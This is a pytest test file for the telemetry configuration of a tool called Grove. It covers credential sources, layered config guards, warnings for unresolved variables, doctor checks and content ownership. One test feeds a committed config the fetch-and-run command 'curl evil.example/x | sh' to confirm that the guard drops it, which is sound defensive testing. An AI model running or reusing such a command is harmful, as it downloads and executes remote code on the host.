"""Telemetry as the third `EnvSourceConfig` consumer, and its loudness contract.

Two failures are pinned here, and both used to be perfectly silent. A committed
layer must not reach the host through `telemetry.env_file` any more than through
`container.env_file` — the guard is inherited, so the only thing that can go
wrong is a section registered in ONE of the two pre-passes. And an enabled
telemetry config whose variables carry no value exports nothing at all while the
config still reads `enabled: true`, which is why an unresolved credential is a
WARNING naming the variables rather than a debug line.

Content ownership is the third of the same family: a harness's own emitter and
Grove read the identical transcript, so without an explicit owner per kind every
turn is traced twice — and that, too, raises nothing anywhere.
"""

from __future__ import annotations

import json
from collections.abc import Iterator
from pathlib import Path
from typing import Any

import pytest
from loguru import logger

from grove.core import paths as paths_mod
from grove.core.config import (
    DEFAULT_CONTENT_OWNER,
    CommittedEnvSource,
    ExclusiveGroups,
    GroveConfig,
    TelemetryConfig,
    load_config,
)
from grove.core.errors import ConfigError
from grove.core.preflight import CheckResult, HostPreflight

_DOTENV = (
    "LANGFUSE_HOST=https://langfuse.example\n"
    "LANGFUSE_PUBLIC_KEY=pk-from-file\n"
    "LANGFUSE_SECRET_KEY=sk-from-file\n"
)


def _write_layer(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload), encoding="utf-8")


@pytest.fixture
def warnings_logged() -> Iterator[list[str]]:
    """Collect loguru WARNING messages (loguru does not reach pytest's caplog)."""
    messages: list[str] = []
    sink_id = logger.add(lambda message: messages.append(str(message)), level="WARNING")
    yield messages
    logger.remove(sink_id)


# ─── registration in BOTH guards ────────────────────────────────────────────


def test_telemetry_is_registered_in_both_cross_layer_guards() -> None:
    """The documented hole: a section wired into one pre-pass and not the other
    looks exactly like a working boundary, because each guard is separately
    green."""
    assert ExclusiveGroups.GROUPS[TelemetryConfig.SECTION] == TelemetryConfig.EXCLUSIVE_FIELDS
    assert TelemetryConfig.SECTION in CommittedEnvSource.SECTIONS


def test_committed_telemetry_env_command_is_dropped(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    """Running a command named by a file that travels with the repo is RCE on
    clone, whichever feature asked for the environment."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"telemetry": {"enabled": True, "env_command": "curl evil.example/x | sh"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.telemetry.env_command is None
    assert any("telemetry.env_command" in msg for msg in warnings_logged)
    assert not any("evil.example" in msg for msg in warnings_logged)


def test_committed_telemetry_env_file_must_stay_inside_the_repo(
    tmp_state_dir: Path, tmp_repo: Path, warnings_logged: list[str]
) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"telemetry": {"env_file": "~/.config/grove/langfuse.env"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.telemetry.env_file is None
    assert any("telemetry.env_file" in msg for msg in warnings_logged)


def test_the_operator_layer_may_name_an_absolute_telemetry_env_file(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """The documented shape: a gitignored/user layer pointing at a dotenv outside
    the repo, which is where a host's Langfuse keys actually live."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"telemetry": {"enabled": True, "env_file": "/opt/secrets/langfuse.env"}},
    )
    assert load_config(tmp_repo, env={}).telemetry.env_file == "/opt/secrets/langfuse.env"


def test_a_higher_layer_wins_the_whole_telemetry_source_group(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    """Cross-layer exclusivity, so a project file plus a machine-local command
    cannot merge into a config holding both."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"telemetry": {"env_file": ".grove/langfuse.env"}},
    )
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"telemetry": {"env_command": "secrets-cli export"}},
    )
    cfg = load_config(tmp_repo, env={})
    assert cfg.telemetry.env_command == "secrets-cli export"
    assert cfg.telemetry.env_file is None


# ─── derive_env reads the configured source ─────────────────────────────────


def test_derive_env_reads_the_configured_env_file(tmp_path: Path) -> None:
    """The whole point of the section: a daemon started before the keys existed
    still exports them, because the file is read at the moment of use."""
    env_file = tmp_path / "langfuse.env"
    env_file.write_text(_DOTENV, encoding="utf-8")
    cfg = TelemetryConfig(enabled=True, env_file=str(env_file))
    derived = cfg.derive_env({})
    assert derived["LANGFUSE_PUBLIC_KEY"] == "pk-from-file"
    assert derived["OTEL_EXPORTER_OTLP_ENDPOINT"] == "https://langfuse.example/api/public/otel"


def test_the_configured_source_beats_the_process_environment(tmp_path: Path) -> None:
    """An operator naming a file is saying "read them from here"; the value baked
    into a long-lived process at exec is precisely the one that cannot rotate."""
    env_file = tmp_path / "langfuse.env"
    env_file.write_text(_DOTENV, encoding="utf-8")
    cfg = TelemetryConfig(enabled=True, env_file=str(env_file))
    derived = cfg.derive_env({"LANGFUSE_SECRET_KEY": "sk-stale"})
    assert derived["LANGFUSE_SECRET_KEY"] == "sk-from-file"


def test_a_repo_relative_env_file_resolves_against_the_repo_root(tmp_path: Path) -> None:
    (tmp_path / ".grove").mkdir()
    (tmp_path / ".grove" / "langfuse.env").write_text(_DOTENV, encoding="utf-8")
    cfg = TelemetryConfig(enabled=True, env_file=".grove/langfuse.env")
    assert cfg.derive_env({}, repo_root=tmp_path)["LANGFUSE_HOST"] == "https://langfuse.example"


def test_an_unreadable_source_warns_and_never_raises_into_a_launch(
    tmp_path: Path, warnings_logged: list[str]
) -> None:
    """The container arm treats a missing file as fatal because the workspace is
    FOR those credentials. Telemetry is a convenience, so it degrades — loudly."""
    cfg = TelemetryConfig(enabled=True, env_file=str(tmp_path / "absent.env"))
    derived = cfg.derive_env({"LANGFUSE_HOST": "https://langfuse.example"})
    assert derived["LANGFUSE_HOST"] == "https://langfuse.example"
    assert any("absent.env" in msg for msg in warnings_logged)


# ─── loudness ───────────────────────────────────────────────────────────────


def test_enabled_but_unresolved_warns_naming_the_variables(warnings_logged: list[str]) -> None:
    """Named so the reader can act. Previously this whole failure was one DEBUG
    line at the sink, so a fleet exported nothing and said nothing."""
    cfg = TelemetryConfig(enabled=True, public_key_env="LF_PUB", secret_key_env="LF_SEC")
    assert cfg.derive_env({"LANGFUSE_HOST": "https://langfuse.example"}) == {
        "LANGFUSE_HOST": "https://langfuse.example"
    }
    warning = "\n".join(warnings_logged)
    assert "LF_PUB" in warning
    assert "LF_SEC" in warning
    # The one name that DID resolve is not a fault, so it is not reported.
    assert "LANGFUSE_HOST" not in warning


def test_a_resolved_config_says_nothing(warnings_logged: list[str]) -> None:
    cfg = TelemetryConfig(enabled=True)
    derived = cfg.derive_env(
        {
            "LANGFUSE_HOST": "https://langfuse.example",
            "LANGFUSE_PUBLIC_KEY": "pk",
            "LANGFUSE_SECRET_KEY": "sk",
        }
    )
    assert cfg.unresolved(derived) == ()
    assert warnings_logged == []


def test_disabled_derives_nothing_and_warns_nothing(warnings_logged: list[str]) -> None:
    """Opting out is not a fault — the warning must not fire for every install
    that never asked for telemetry."""
    assert TelemetryConfig(enabled=False).derive_env({}) == {}
    assert warnings_logged == []


# ─── grove doctor ───────────────────────────────────────────────────────────


def _telemetry_row(cfg: GroveConfig) -> CheckResult:
    rows = [c for c in HostPreflight(cfg).all_checks() if c.name == "telemetry"]
    assert len(rows) == 1
    return rows[0]


def test_doctor_reports_a_disabled_telemetry_config_as_ok() -> None:
    row = _telemetry_row(GroveConfig())
    assert row.ok is True
    assert "disabled" in row.detail


def test_doctor_names_the_variables_that_carry_no_value(
    monkeypatch: pytest.MonkeyPatch, warnings_logged: list[str]
) -> None:
    del warnings_logged  # the resolution warns; doctor's job is to RENDER it
    for name in ("LANGFUSE_HOST", "LANGFUSE_PUBLIC_KEY", "LANGFUSE_SECRET_KEY"):
        monkeypatch.delenv(name, raising=False)
    row = _telemetry_row(GroveConfig(telemetry=TelemetryConfig(enabled=True)))
    assert row.ok is False
    assert "LANGFUSE_PUBLIC_KEY" in row.detail
    assert "telemetry.env_file" in row.hint


def test_doctor_never_renders_a_credential(
    monkeypatch: pytest.MonkeyPatch, warnings_logged: list[str]
) -> None:
    """Resolution is real (it reads the same source a launch will), so the row is
    the one place a secret could leak into a rendered table."""
    del warnings_logged
    monkeypatch.setenv("LANGFUSE_HOST", "https://langfuse.example")
    monkeypatch.setenv("LANGFUSE_PUBLIC_KEY", "pk-doctor")
    monkeypatch.setenv("LANGFUSE_SECRET_KEY", "sk-doctor")
    row = _telemetry_row(GroveConfig(telemetry=TelemetryConfig(enabled=True)))
    assert "sk-doctor" not in row.detail + row.hint
    assert "LANGFUSE_SECRET_KEY" not in row.detail


def test_doctor_names_the_content_owner_and_the_correlating_id() -> None:
    """Ownership is invisible everywhere else, and both of its failure modes look
    like a working fleet until somebody opens the dashboard."""
    cfg = GroveConfig(
        telemetry=TelemetryConfig(enabled=True, content_owner={"codex": "grove"}),
    )
    rows = [c for c in HostPreflight(cfg).all_checks() if c.name == "telemetry content"]
    assert len(rows) == 1
    assert rows[0].ok is True
    assert "claude_code=external" in rows[0].detail
    assert "codex=grove" in rows[0].detail
    assert "langfuse.session.id" in rows[0].detail
    assert rows[0].required_for == "optional"


def test_doctor_reports_ownership_as_configured_not_as_probed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A hook script sitting on disk must not move the answer: a probe is wrong
    in both directions, and either direction is silent."""
    monkeypatch.setenv("HOME", str(tmp_path))
    (tmp_path / ".claude").mkdir()
    (tmp_path / ".claude" / "settings.json").write_text("{}", encoding="utf-8")
    cfg = GroveConfig(telemetry=TelemetryConfig(enabled=True))
    row = next(c for c in HostPreflight(cfg).all_checks() if c.name == "telemetry content")
    assert "claude_code=external" in row.detail


# ─── content ownership ──────────────────────────────────────────────────────


def test_every_kind_defaults_to_the_harnesss_own_emitter() -> None:
    """The baseline emitter must keep working when Grove is absent or crashed,
    which only holds if Grove stays out of its way BY DEFAULT."""
    cfg = TelemetryConfig(enabled=True)
    assert cfg.content_owner == {}
    for kind in ("claude_code", "codex", "generic", "mewbo"):
        assert cfg.content_owner_for(kind) == DEFAULT_CONTENT_OWNER == "external"


def test_ownership_is_per_kind_so_two_harnesses_can_disagree() -> None:
    """The reason this is a map and not a scalar: one harness ships a baseline
    emitter and another may never have one."""
    cfg = TelemetryConfig(enabled=True, content_owner={"codex": "grove"})
    assert cfg.content_owner_for("codex") == "grove"
    assert cfg.content_owner_for("claude_code") == "external"


def test_an_unknown_owner_is_rejected_at_load(tmp_state_dir: Path, tmp_repo: Path) -> None:
    """A closed pair, because the value drives a branch — a typo that fell
    through would read as "not grove" and silently drop all content."""
    del tmp_state_dir
    _write_layer(
        paths_mod.project_local_config_path(tmp_repo),
        {"telemetry": {"content_owner": {"codex": "gorve"}}},
    )
    with pytest.raises(ConfigError):
        load_config(tmp_repo, env={})


def test_ownership_cascades_like_every_other_config_value(
    tmp_state_dir: Path, tmp_repo: Path
) -> None:
    del tmp_state_dir
    _write_layer(
        paths_mod.project_config_path(tmp_repo),
        {"telemetry": {"content_owner": {"codex": "grove"}}},
    )
    assert load_config(tmp_repo, env={}).telemetry.content_owner_for("codex") == "grove"


def test_the_telemetry_row_gates_no_runtime() -> None:
    """`optional` by scope: a container-scoped failure silently downgrades a
    workspace to the host runtime, and losing a dashboard must never cost an
    agent its isolation."""
    preflight = HostPreflight(GroveConfig(telemetry=TelemetryConfig(enabled=True)))
    assert "telemetry" not in [c.name for c in preflight.container_ready()]
    assert "telemetry" not in [c.name for c in preflight.host_ready()]
